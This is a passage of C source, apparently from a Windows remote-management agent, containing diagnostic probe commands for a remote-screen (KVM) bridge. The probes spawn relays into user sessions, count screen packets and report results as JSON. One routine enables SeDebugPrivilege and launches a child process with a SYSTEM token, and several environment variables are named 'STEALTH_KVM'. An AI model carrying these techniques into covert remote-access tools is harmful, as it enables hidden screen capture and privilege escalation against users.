		printf("{\"success\":false,\"phase\":\"kvm-bridge-event-audit-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
		fflush(stdout);
		return 1;
	}

	bridgeDllReady = MeshService_GetCurrentBuildBridgeDllPathW(bridgeDllPath, _countof(bridgeDllPath));
	serviceNameReady = MeshService_GetServiceNameW(serviceNameBuf, _countof(serviceNameBuf));
	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));

	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	StringCchPrintfW(missingExePath, _countof(missingExePath), L"%lsMeshMissingKvmAudit_%lu.exe", tempPath, GetCurrentProcessId());
	DeleteFileW(missingExePath);
	ILibWideToUTF8Ex(missingExePath, -1, missingExePathA, (int)sizeof(missingExePathA));

	previousBridgeDllLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, (DWORD)_countof(previousBridgeDll));
	if (previousBridgeDllLen >= _countof(previousBridgeDll)) { previousBridgeDllLen = 0; previousBridgeDll[0] = L'\0'; }
	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }

	if (bridgeDllReady)
	{
		SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", bridgeDllPath);
	}
	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", NULL);

	if (bridgeDllReady && serviceNameReady && chainStarted)
	{
		successRelayStarted = (kvm_relay_setup(exePath, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
	}
	successBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
	successFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
	failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
	failureError = kvm_bridge_debug_get_last_bridge_failure_error();
	failureSpawnAttempts = kvm_bridge_debug_get_spawn_attempt_count();
	if (successRelayStarted)
	{
		successBridgeSpawned = MeshService_WaitForBridgePidChange(0, 5000, &successBridgeSpawnMs, &successBridgePid);
		if (successBridgeSpawned)
		{
			successBridgePacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, 5000, &successBridgePacketMs);
			successBridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
			successFallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
		}
		kvm_cleanup(&state);
		if (successBridgePid != 0)
		{
			successCleanupExited = MeshService_WaitForProcessExitById(successBridgePid, 5000, &successCleanupExitMs);
		}
		else
		{
			successCleanupExited = TRUE;
		}
		Sleep(250);
	}

	ZeroMemory(&state, sizeof(state));
	if (bridgeDllReady)
	{
		SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", bridgeDllPath);
	}
	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", L"193");

	if (bridgeDllReady && serviceNameReady && chainStarted)
	{
		failureRelayStarted = (kvm_relay_setup(missingExePathA, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
	}
	if (!failureRelayStarted)
	{
		failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
		failureError = kvm_bridge_debug_get_last_bridge_failure_error();
		failureSpawnAttempts = kvm_bridge_debug_get_spawn_attempt_count();
	}
	if (failureRelayStarted)
	{
		failureObserved = MeshService_WaitForKvmFailureCount(1, 10000, &failureWaitMs);
		if (failureObserved)
		{
			failureCount = kvm_bridge_debug_get_consecutive_failures();
			failureDelayMs = kvm_bridge_debug_get_last_backoff_delay_ms();
			failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
			failureError = kvm_bridge_debug_get_last_bridge_failure_error();
			failureRetryScheduled = (kvm_bridge_debug_is_retry_scheduled() != 0);
			failureSpawnAttempts = kvm_bridge_debug_get_spawn_attempt_count();
		}
		kvm_cleanup(&state);
		Sleep(250);
	}

	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, previousBridgeDllLen);
	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);

	success =
		bridgeDllReady &&
		serviceNameReady &&
		chainStarted &&
		successRelayStarted &&
		successBridgeSpawned &&
		successBridgePacketsReady &&
		successBridgeUsed &&
		!successFallbackUsed &&
		successCleanupExited &&
		failureRelayStarted &&
		failureObserved &&
		failureCount >= 1 &&
		failureDelayMs == 2000 &&
		failureStage == 7 &&
		failureError == 193 &&
		failureRetryScheduled &&
		failureSpawnAttempts > 0;

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-bridge-event-audit-probe\",");
	printf("\"sessionId\":%lu,", (unsigned long)sessionId);
	printf("\"serviceName\":\""); MeshService_PrintJsonEscapedWide(serviceNameBuf); printf("\",");
	printf("\"bridgeDllPath\":\""); MeshService_PrintJsonEscapedWide(bridgeDllPath); printf("\",");
	printf("\"eventIdAttempt\":%lu,", (unsigned long)MESH_KVM_BRIDGE_EVENT_ID_ATTEMPT);
	printf("\"eventIdOutcome\":%lu,", (unsigned long)MESH_KVM_BRIDGE_EVENT_ID_OUTCOME);
	printf("\"successRelayStarted\":%s,", successRelayStarted ? "true" : "false");
	printf("\"successBridgeSpawned\":%s,", successBridgeSpawned ? "true" : "false");
	printf("\"successBridgePacketsReady\":%s,", successBridgePacketsReady ? "true" : "false");
	printf("\"successBridgeUsed\":%s,", successBridgeUsed ? "true" : "false");
	printf("\"successFallbackUsed\":%s,", successFallbackUsed ? "true" : "false");
	printf("\"successBridgePid\":%lu,", (unsigned long)successBridgePid);
	printf("\"successBridgeSpawnMs\":%lu,", (unsigned long)successBridgeSpawnMs);
	printf("\"successBridgePacketMs\":%lu,", (unsigned long)successBridgePacketMs);
	printf("\"successCleanupExited\":%s,", successCleanupExited ? "true" : "false");
	printf("\"successCleanupExitMs\":%lu,", (unsigned long)successCleanupExitMs);
	printf("\"failureRelayStarted\":%s,", failureRelayStarted ? "true" : "false");
	printf("\"failureObserved\":%s,", failureObserved ? "true" : "false");
	printf("\"failureWaitMs\":%lu,", (unsigned long)failureWaitMs);
	printf("\"failureCount\":%lu,", (unsigned long)failureCount);
	printf("\"failureDelayMs\":%lu,", (unsigned long)failureDelayMs);
	printf("\"failureStage\":%lu,", (unsigned long)failureStage);
	printf("\"failureError\":%lu,", (unsigned long)failureError);
	printf("\"failureRetryScheduled\":%s,", failureRetryScheduled ? "true" : "false");
	printf("\"failureSpawnAttempts\":%lu,", (unsigned long)failureSpawnAttempts);
	printf("\"chainThreadWaitResult\":%lu}\n", (unsigned long)chainThreadWaitResult);
	fflush(stdout);
	return success ? 0 : 1;
}

static int MeshService_RunKvmBridgeEventAuditProbeChildCommand(const WCHAR* reportPath)
{
	FILE* redirectedStdout = NULL;
	errno_t redirectError = 0;

	if (reportPath != NULL && reportPath[0] != L'\0')
	{
		redirectError = _wfreopen_s(&redirectedStdout, reportPath, L"wb", stdout);
		if (redirectError != 0 || redirectedStdout == NULL)
		{
			return 1;
		}
	}
	return MeshService_RunKvmBridgeEventAuditProbeWorkerCommand();
}

static int MeshService_RunKvmBridgeEventAuditProbeCommand(void)
{
	WCHAR tempPath[MAX_PATH] = { 0 };
	WCHAR reportPath[MAX_PATH] = { 0 };
	WCHAR arguments[512] = { 0 };
	HANDLE systemToken = NULL;
	PROCESS_INFORMATION childProcess;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD systemTokenError = ERROR_SUCCESS;
	DWORD spawnError = ERROR_SUCCESS;
	DWORD childExitCode = STILL_ACTIVE;
	BOOL systemTokenReady = FALSE;
	BOOL childSpawned = FALSE;
	char* childJson = NULL;

	if (MeshService_ProcessHasSystemSid())
	{
		return MeshService_RunKvmBridgeEventAuditProbeWorkerCommand();
	}

	ZeroMemory(&childProcess, sizeof(childProcess));
	if (ExpandEnvironmentStringsW(L"%TEMP%\\", tempPath, (DWORD)_countof(tempPath)) == 0 || tempPath[0] == L'\0')
	{
		GetTempPathW((DWORD)_countof(tempPath), tempPath);
	}
	StringCchPrintfW(reportPath, _countof(reportPath), L"%lsMeshKvmEventAuditProbe_%lu.json", tempPath, GetCurrentProcessId());
	DeleteFileW(reportPath);

	MeshService_EnableNamedPrivilegeW(L"SeDebugPrivilege");
	systemTokenReady = MeshService_OpenPrimarySystemTokenForSession(sessionId, &systemToken, &systemTokenError);
	if (systemTokenReady)
	{
		StringCchPrintfW(arguments, _countof(arguments), L"-kvm-bridge-event-audit-probe-child \"%ls\"", reportPath);
		childSpawned = MeshService_SpawnProcessWithTokenW(systemToken, arguments, L"winsta0\\default", &childProcess, &spawnError);
	}
	if (childSpawned)
	{
		WaitForSingleObject(childProcess.hProcess, 60000);
		GetExitCodeProcess(childProcess.hProcess, &childExitCode);
	}

	childJson = MeshService_ReadUtf8TextFileW(reportPath);
	if (childJson != NULL)
	{
		printf("%s\n", childJson);
	}
	else
	{
		printf("{\"success\":false,\"phase\":\"kvm-bridge-event-audit-probe\",\"sessionId\":%lu,\"systemTokenReady\":%s,\"childSpawned\":%s,\"systemTokenError\":%lu,\"spawnError\":%lu,\"childExitCode\":%lu}\n",
			(unsigned long)sessionId,
			systemTokenReady ? "true" : "false",
			childSpawned ? "true" : "false",
			(unsigned long)systemTokenError,
			(unsigned long)spawnError,
			(unsigned long)childExitCode);
	}
	fflush(stdout);

	if (childProcess.hThread != NULL) { CloseHandle(childProcess.hThread); }
	if (childProcess.hProcess != NULL) { CloseHandle(childProcess.hProcess); }
	if (systemToken != NULL) { CloseHandle(systemToken); }
	if (childJson != NULL) { free(childJson); }
	DeleteFileW(reportPath);
	return (childSpawned && childExitCode == 0 && childJson != NULL) ? 0 : 1;
}

static int MeshService_RunKvmBridgeConnectDelayProbeCommand(DWORD requestedConnectDelayMs)
{
	MeshServiceKvmProbeChain probeChain;
	MeshServiceKvmSessionChangeProbeState state;
	WCHAR bridgeDllPath[MAX_PATH * 4] = { 0 };
	WCHAR previousBridgeDll[MAX_PATH * 4] = { 0 };
	WCHAR previousForceExitCode[64] = { 0 };
	WCHAR previousConnectDelay[64] = { 0 };
	WCHAR previousTraceStartup[16] = { 0 };
	WCHAR connectDelayText[32] = { 0 };
	char exePath[MAX_PATH * 4] = { 0 };
	DWORD previousBridgeDllLen = 0;
	DWORD previousForceExitCodeLen = 0;
	DWORD previousConnectDelayLen = 0;
	DWORD previousTraceStartupLen = 0;
	DWORD sessionId = MeshService_GetCurrentSessionId();
	DWORD relaySetupMs = 0;
	DWORD bridgePacketMs = 0;
	DWORD cleanupExitMs = 0;
	DWORD bridgePid = 0;
	DWORD launchAttemptCount = 0;
	DWORD successfulSpawnType = 0;
	DWORD successfulSpawnAttemptOrdinal = 0;
	DWORD failureStage = 0;
	DWORD failureError = 0;
	DWORD failureCount = 0;
	DWORD chainThreadWaitResult = WAIT_OBJECT_0;
	ULONGLONG setupStartedTickMs = 0;
	BOOL bridgeDllReady = FALSE;
	BOOL chainStarted = FALSE;
	BOOL relayStarted = FALSE;
	BOOL bridgeSpawned = FALSE;
	BOOL bridgePacketsReady = FALSE;
	BOOL bridgeUsed = FALSE;
	BOOL fallbackUsed = FALSE;
	BOOL transportActiveAfterPacket = FALSE;
	BOOL cleanupExited = FALSE;
	BOOL success = FALSE;

	if (requestedConnectDelayMs > 60000UL) { requestedConnectDelayMs = 60000UL; }

	MeshService_KvmProbeChain_Init(&probeChain);
	ZeroMemory(&state, sizeof(state));

	if (sessionId == 0 || sessionId == 0xFFFFFFFF)
	{
		printf("{\"success\":false,\"phase\":\"kvm-bridge-connect-delay-probe\",\"sessionId\":%lu,\"error\":\"invalid-session\"}\n", (unsigned long)sessionId);
		fflush(stdout);
		return 1;
	}

	bridgeDllReady = MeshService_GetCurrentBuildBridgeDllPathW(bridgeDllPath, _countof(bridgeDllPath));
	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));

	previousBridgeDllLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, (DWORD)_countof(previousBridgeDll));
	if (previousBridgeDllLen >= _countof(previousBridgeDll)) { previousBridgeDllLen = 0; previousBridgeDll[0] = L'\0'; }
	previousForceExitCodeLen = GetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, (DWORD)_countof(previousForceExitCode));
	if (previousForceExitCodeLen >= _countof(previousForceExitCode)) { previousForceExitCodeLen = 0; previousForceExitCode[0] = L'\0'; }
	previousConnectDelayLen = GetEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, previousConnectDelay, (DWORD)_countof(previousConnectDelay));
	if (previousConnectDelayLen >= _countof(previousConnectDelay)) { previousConnectDelayLen = 0; previousConnectDelay[0] = L'\0'; }
	previousTraceStartupLen = GetEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", previousTraceStartup, (DWORD)_countof(previousTraceStartup));
	if (previousTraceStartupLen >= _countof(previousTraceStartup)) { previousTraceStartupLen = 0; previousTraceStartup[0] = L'\0'; }

	if (bridgeDllReady)
	{
		SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", bridgeDllPath);
	}
	SetEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", NULL);
	StringCchPrintfW(connectDelayText, _countof(connectDelayText), L"%lu", (unsigned long)requestedConnectDelayMs);
	SetEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, connectDelayText);
	SetEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", L"1");

	if (bridgeDllReady && chainStarted)
	{
		setupStartedTickMs = GetTickCount64();
		relayStarted = (kvm_relay_setup(exePath, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &state, (int)sessionId) != 0);
		relaySetupMs = (DWORD)(GetTickCount64() - setupStartedTickMs);
	}

	bridgePid = kvm_bridge_debug_get_child_pid();
	bridgeSpawned = (bridgePid != 0 && MeshService_IsProcessAliveById(bridgePid));
	bridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
	fallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
	launchAttemptCount = kvm_bridge_debug_get_last_launch_attempt_count();
	successfulSpawnType = kvm_bridge_debug_get_last_successful_spawn_type();
	successfulSpawnAttemptOrdinal = kvm_bridge_debug_get_last_successful_spawn_attempt_ordinal();
	failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
	failureError = kvm_bridge_debug_get_last_bridge_failure_error();
	failureCount = kvm_bridge_debug_get_consecutive_failures();

	if (relayStarted)
	{
		bridgePacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&state, KVM_BRIDGE_CONNECT_TIMEOUT_MS, &bridgePacketMs);
		transportActiveAfterPacket = (kvm_bridge_debug_get_transport_active() != 0);
		bridgeUsed = (kvm_bridge_debug_get_last_used_bridge() != 0);
		fallbackUsed = (kvm_bridge_debug_get_last_fallback_used() != 0);
		launchAttemptCount = kvm_bridge_debug_get_last_launch_attempt_count();
		successfulSpawnType = kvm_bridge_debug_get_last_successful_spawn_type();
		successfulSpawnAttemptOrdinal = kvm_bridge_debug_get_last_successful_spawn_attempt_ordinal();
		failureStage = kvm_bridge_debug_get_last_bridge_failure_stage();
		failureError = kvm_bridge_debug_get_last_bridge_failure_error();
		failureCount = kvm_bridge_debug_get_consecutive_failures();
		kvm_cleanup(&state);
		if (bridgePid != 0)
		{
			cleanupExited = MeshService_WaitForProcessExitById(bridgePid, 5000, &cleanupExitMs);
		}
		else
		{
			cleanupExited = TRUE;
		}
	}

	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_DLL", previousBridgeDll, previousBridgeDllLen);
	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_BRIDGE_FORCE_EXIT_CODE", previousForceExitCode, previousForceExitCodeLen);
	MeshService_RestoreEnvironmentVariableW(KVM_BRIDGE_CONNECT_DELAY_ENV_W, previousConnectDelay, previousConnectDelayLen);
	MeshService_RestoreEnvironmentVariableW(L"STEALTH_KVM_TRACE_STARTUP", previousTraceStartup, previousTraceStartupLen);
	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);

	success = bridgeDllReady &&
		chainStarted &&
		relayStarted &&
		bridgeSpawned &&
		bridgePacketsReady &&
		bridgeUsed &&
		!fallbackUsed &&
		launchAttemptCount == 1 &&
		successfulSpawnType == (DWORD)ILibProcessPipe_SpawnTypes_WINLOGON &&
		successfulSpawnAttemptOrdinal == 1 &&
		transportActiveAfterPacket &&
		(failureCount == 0) &&
		(failureStage == 0) &&
		(failureError == 0) &&
		cleanupExited;

	printf("{\"success\":%s,\"phase\":\"kvm-bridge-connect-delay-probe\",\"sessionId\":%lu,\"requestedConnectDelayMs\":%lu,"
		"\"bridgeDllReady\":%s,\"chainStarted\":%s,\"relayStarted\":%s,\"relaySetupMs\":%lu,\"bridgeSpawned\":%s,\"bridgePid\":%lu,"
		"\"bridgePacketsReady\":%s,\"bridgePacketMs\":%lu,\"bridgeUsed\":%s,\"fallbackUsed\":%s,\"transportActiveAfterPacket\":%s,"
		"\"launchAttemptCount\":%lu,\"successfulSpawnType\":%lu,\"successfulSpawnAttemptOrdinal\":%lu,"
		"\"failureCount\":%lu,\"failureStage\":%lu,\"failureError\":%lu,\"cleanupExited\":%s,\"cleanupExitMs\":%lu,"
		"\"screenPackets\":%ld,\"displayListPackets\":%ld,\"displayInfoPackets\":%ld,\"cursorPackets\":%ld,\"picturePackets\":%ld,\"jumboPackets\":%ld,"
		"\"chainThreadWaitResult\":%lu}\n",
		success ? "true" : "false",
		(unsigned long)sessionId,
		(unsigned long)requestedConnectDelayMs,
		bridgeDllReady ? "true" : "false",
		chainStarted ? "true" : "false",
		relayStarted ? "true" : "false",
		(unsigned long)relaySetupMs,
		bridgeSpawned ? "true" : "false",
		(unsigned long)bridgePid,
		bridgePacketsReady ? "true" : "false",
		(unsigned long)bridgePacketMs,
		bridgeUsed ? "true" : "false",
		fallbackUsed ? "true" : "false",
		transportActiveAfterPacket ? "true" : "false",
		(unsigned long)launchAttemptCount,
		(unsigned long)successfulSpawnType,
		(unsigned long)successfulSpawnAttemptOrdinal,
		(unsigned long)failureCount,
		(unsigned long)failureStage,
		(unsigned long)failureError,
		cleanupExited ? "true" : "false",
		(unsigned long)cleanupExitMs,
		state.screenPackets,
		state.displayListPackets,
		state.displayInfoPackets,
		state.cursorPackets,
		state.picturePackets,
		state.jumboPackets,
		(unsigned long)chainThreadWaitResult);
	fflush(stdout);
	return success ? 0 : 1;
}

static int MeshService_RunKvmMultiSessionProbeCommand(DWORD primarySessionId, int secondaryTsid)
{
	MeshServiceKvmProbeChain probeChain;
	MeshServiceKvmSessionChangeProbeState stateA;
	MeshServiceKvmSessionChangeProbeState stateB;
	char exePath[MAX_PATH * 4] = { 0 };
	DWORD relay1Pid = 0;
	DWORD relay2Pid = 0;
	DWORD relay1SpawnMs = 0;
	DWORD relay2SpawnMs = 0;
	DWORD relay1PacketMs = 0;
	DWORD relay2PacketMs = 0;
	DWORD relay1IsolatedPacketMs = 0;
	DWORD relay2IsolatedPacketMs = 0;
	DWORD cleanup1ExitMs = 0;
	DWORD cleanup2ExitMs = 0;
	DWORD chainThreadWaitResult = WAIT_OBJECT_0;
	DWORD relay1ProcessSessionId = 0xFFFFFFFF;
	DWORD relay2ProcessSessionId = 0xFFFFFFFF;
	LONG relay1BaselinePackets = 0;
	LONG relay2BaselinePackets = 0;
	LONG relay1Phase1Delta = 0;
	LONG relay2Phase1Delta = 0;
	LONG relay1Phase2Delta = 0;
	LONG relay2Phase2Delta = 0;
	int registeredContextCountAfterStart = 0;
	int registeredContextCountAfterCleanup = 0;
	BOOL chainStarted = FALSE;
	BOOL relay1Started = FALSE;
	BOOL relay2Started = FALSE;
	BOOL relay1Spawned = FALSE;
	BOOL relay2Spawned = FALSE;
	BOOL relay1PacketsReady = FALSE;
	BOOL relay2PacketsReady = FALSE;
	BOOL relay1TransportActive = FALSE;
	BOOL relay2TransportActive = FALSE;
	BOOL relay1BridgeUsed = FALSE;
	BOOL relay2BridgeUsed = FALSE;
	BOOL relay1FallbackUsed = FALSE;
	BOOL relay2FallbackUsed = FALSE;
	BOOL relay1IsolatedPacketsReady = FALSE;
	BOOL relay2IsolatedPacketsReady = FALSE;
	BOOL cleanup1Exited = FALSE;
	BOOL cleanup2Exited = FALSE;
	BOOL success = FALSE;

	MeshService_KvmProbeChain_Init(&probeChain);
	ZeroMemory(&stateA, sizeof(stateA));
	ZeroMemory(&stateB, sizeof(stateB));
	if (primarySessionId == 0 || primarySessionId == 0xFFFFFFFF)
	{
		printf("{\"success\":false,\"phase\":\"kvm-multi-session-probe\",\"primarySessionId\":%lu,\"secondaryRequestedTsid\":%d,\"error\":\"invalid-primary-session\"}\n",
			(unsigned long)primarySessionId,
			secondaryTsid);
		fflush(stdout);
		return 1;
	}

	chainStarted = MeshService_KvmProbeChain_Start(&probeChain);
	GetModuleFileNameA(NULL, exePath, (DWORD)sizeof(exePath));

	if (chainStarted)
	{
		relay1Started = (kvm_relay_setup(exePath, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &stateA, (int)primarySessionId) != 0);
	}
	if (relay1Started)
	{
		relay1Spawned = MeshService_WaitForBridgePidForReserved(&stateA, 0, 10000, &relay1SpawnMs, &relay1Pid);
		if (relay1Spawned)
		{
			relay1PacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateA, 5000, &relay1PacketMs);
			relay1TransportActive = (kvm_bridge_debug_get_transport_active_for_reserved(&stateA) != 0);
			relay1BridgeUsed = (kvm_bridge_debug_get_last_used_bridge_for_reserved(&stateA) != 0);
			relay1FallbackUsed = (kvm_bridge_debug_get_last_fallback_used_for_reserved(&stateA) != 0);
			relay1ProcessSessionId = kvm_bridge_debug_get_process_session_id_for_reserved(&stateA);
		}
	}

	if (chainStarted)
	{
		relay2Started = (kvm_relay_setup(exePath, probeChain.pipeManager, MeshService_KvmSessionChangeProbeWriteSink, &stateB, secondaryTsid) != 0);
	}
	if (relay2Started)
	{
		relay2Spawned = MeshService_WaitForBridgePidForReserved(&stateB, relay1Pid, 10000, &relay2SpawnMs, &relay2Pid);
		if (relay2Spawned)
		{
			relay2PacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateB, 5000, &relay2PacketMs);
			relay2TransportActive = (kvm_bridge_debug_get_transport_active_for_reserved(&stateB) != 0);
			relay2BridgeUsed = (kvm_bridge_debug_get_last_used_bridge_for_reserved(&stateB) != 0);
			relay2FallbackUsed = (kvm_bridge_debug_get_last_fallback_used_for_reserved(&stateB) != 0);
			relay2ProcessSessionId = kvm_bridge_debug_get_process_session_id_for_reserved(&stateB);
		}
	}

	registeredContextCountAfterStart = kvm_bridge_debug_get_registered_context_count();

	if (relay1PacketsReady && relay2PacketsReady)
	{
		kvm_pause(1, &stateA);
		kvm_pause(1, &stateB);
		Sleep(750);

		relay1BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateA);
		relay2BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateB);
		kvm_pause(0, &stateA);
		relay1IsolatedPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateA, 5000, &relay1IsolatedPacketMs);
		Sleep(500);
		relay1Phase1Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateA) - relay1BaselinePackets;
		relay2Phase1Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateB) - relay2BaselinePackets;
		kvm_pause(1, &stateA);
		Sleep(250);

		relay1BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateA);
		relay2BaselinePackets = MeshService_KvmSessionChangeProbeTotalPackets(&stateB);
		kvm_pause(0, &stateB);
		relay2IsolatedPacketsReady = MeshService_RequestKvmRelayRefreshAndWait(&stateB, 5000, &relay2IsolatedPacketMs);
		Sleep(500);
		relay1Phase2Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateA) - relay1BaselinePackets;
		relay2Phase2Delta = MeshService_KvmSessionChangeProbeTotalPackets(&stateB) - relay2BaselinePackets;
		kvm_pause(1, &stateB);
	}

	if (relay2Started)
	{
		kvm_cleanup(&stateB);
		if (relay2Pid != 0)
		{
			cleanup2Exited = MeshService_WaitForProcessExitById(relay2Pid, 5000, &cleanup2ExitMs);
		}
		else
		{
			cleanup2Exited = TRUE;
		}
	}
	if (relay1Started)
	{
		kvm_cleanup(&stateA);
		if (relay1Pid != 0)
		{
			cleanup1Exited = MeshService_WaitForProcessExitById(relay1Pid, 5000, &cleanup1ExitMs);
		}
		else
		{
			cleanup1Exited = TRUE;
		}
	}
	Sleep(250);
	registeredContextCountAfterCleanup = kvm_bridge_debug_get_registered_context_count();
	chainThreadWaitResult = MeshService_KvmProbeChain_Stop(&probeChain);

	success =
		chainStarted &&
		relay1Started &&
		relay2Started &&
		relay1Spawned &&
		relay2Spawned &&
		relay1PacketsReady &&
		relay2PacketsReady &&
		relay1TransportActive &&
		relay2TransportActive &&
		relay1BridgeUsed &&
		relay2BridgeUsed &&
		!relay1FallbackUsed &&
		!relay2FallbackUsed &&
		relay1Pid != 0 &&
		relay2Pid != 0 &&
		relay1Pid != relay2Pid &&
		registeredContextCountAfterStart >= 2 &&
		relay1ProcessSessionId == primarySessionId &&
		(secondaryTsid >= 0 ? relay2ProcessSessionId == (DWORD)secondaryTsid : (relay2ProcessSessionId != 0 && relay2ProcessSessionId != 0xFFFFFFFF)) &&
		relay1IsolatedPacketsReady &&
		relay2IsolatedPacketsReady &&
		relay1Phase1Delta > 0 &&
		relay2Phase1Delta == 0 &&
		relay1Phase2Delta == 0 &&
		relay2Phase2Delta > 0 &&
		cleanup1Exited &&
		cleanup2Exited &&
		registeredContextCountAfterCleanup == 0 &&
		chainThreadWaitResult == WAIT_OBJECT_0;

	printf("{\"success\":%s,", success ? "true" : "false");
	printf("\"phase\":\"kvm-multi-session-probe\",");
	printf("\"primarySessionId\":%lu,", (unsigned long)primarySessionId);
	printf("\"secondaryRequestedTsid\":%d,", secondaryTsid);
	printf("\"chainStarted\":%s,", chainStarted ? "true" : "false");
	printf("\"registeredContextCountAfterStart\":%d,", registeredContextCountAfterStart);
	printf("\"registeredContextCountAfterCleanup\":%d,", registeredContextCountAfterCleanup);
	printf("\"relay1Started\":%s,", relay1Started ? "true" : "false");
	printf("\"relay1Spawned\":%s,", relay1Spawned ? "true" : "false");
	printf("\"relay1PacketsReady\":%s,", relay1PacketsReady ? "true" : "false");
	printf("\"relay1TransportActive\":%s,", relay1TransportActive ? "true" : "false");
	printf("\"relay1BridgeUsed\":%s,", relay1BridgeUsed ? "true" : "false");
	printf("\"relay1FallbackUsed\":%s,", relay1FallbackUsed ? "true" : "false");
	printf("\"relay1Pid\":%lu,", (unsigned long)relay1Pid);
	printf("\"relay1SpawnMs\":%lu,", (unsigned long)relay1SpawnMs);
	printf("\"relay1PacketMs\":%lu,", (unsigned long)relay1PacketMs);
	printf("\"relay1ProcessSessionId\":%lu,", (unsigned long)relay1ProcessSessionId);
	printf("\"relay2Started\":%s,", relay2Started ? "true" : "false");
	printf("\"relay2Spawned\":%s,", relay2Spawned ? "true" : "false");
	printf("\"relay2PacketsReady\":%s,", relay2PacketsReady ? "true" : "false");
	printf("\"relay2TransportActive\":%s,", relay2TransportActive ? "true" : "false");
	printf("\"relay2BridgeUsed\":%s,", relay2BridgeUsed ? "true" : "false");
	printf("\"relay2FallbackUsed\":%s,", relay2FallbackUsed ? "true" : "false");
	printf("\"relay2Pid\":%lu,", (unsigned long)relay2Pid);
	printf("\"relay2SpawnMs\":%lu,", (unsigned long)relay2SpawnMs);
	printf("\"relay2PacketMs\":%lu,", (unsigned long)relay2PacketMs);
	printf("\"relay2ProcessSessionId\":%lu,", (unsigned long)relay2ProcessSessionId);
	printf("\"relay1IsolatedPacketsReady\":%s,", relay1IsolatedPacketsReady ? "true" : "false");
	printf("\"relay1IsolatedPacketMs\":%lu,", (unsigned long)relay1IsolatedPacketMs);
	printf("\"relay2IsolatedPacketsReady\":%s,", relay2IsolatedPacketsReady ? "true" : "false");
	printf("\"relay2IsolatedPacketMs\":%lu,", (unsigned long)relay2IsolatedPacketMs);
	printf("\"relay1Phase1Delta\":%ld,", relay1Phase1Delta);
	printf("\"relay2Phase1Delta\":%ld,", relay2Phase1Delta);
	printf("\"relay1Phase2Delta\":%ld,", relay1Phase2Delta);
	printf("\"relay2Phase2Delta\":%ld,", relay2Phase2Delta);
	printf("\"relay1TotalPackets\":%ld,", MeshService_KvmSessionChangeProbeTotalPackets(&stateA));
	printf("\"relay2TotalPackets\":%ld,", MeshService_KvmSessionChangeProbeTotalPackets(&stateB));
	printf("\"cleanup1Exited\":%s,", cleanup1Exited ? "true" : "false");
	printf("\"cleanup1ExitMs\":%lu,", (unsigned long)cleanup1ExitMs);
	printf("\"cleanup2Exited\":%s,", cleanup2Exited ? "true" : "false");
	printf("\"cleanup2ExitMs\":%lu,", (unsigned long)cleanup2ExitMs);
